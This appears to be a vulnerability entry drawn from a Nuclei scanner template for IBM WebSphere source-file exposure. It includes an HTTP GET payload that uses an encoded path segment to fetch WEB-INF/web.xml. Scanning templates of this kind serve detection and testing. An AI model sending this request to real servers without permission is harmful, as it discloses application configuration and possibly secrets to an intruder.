# Nuclei Template: IBM WebSphere Application - Source File Exposure
**Template ID:** ibm-websphere-xml
**Vulnerability Class:** Information Disclosure
**Severity:** Medium
**CWE:** CWE-219
**Source:** Nuclei Template (`ibm-websphere-xml.yaml`)

## Vulnerability Information & PoC

## Description
Disclose application specific files contained within the war file, including files under the web-inf and meta-inf directories.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/iojs/%2e/WEB-INF/web.xml
```

## References
- https://www.acunetix.com/vulnerabilities/web/ibm-websphere-weblogic-application-source-file-exposure/
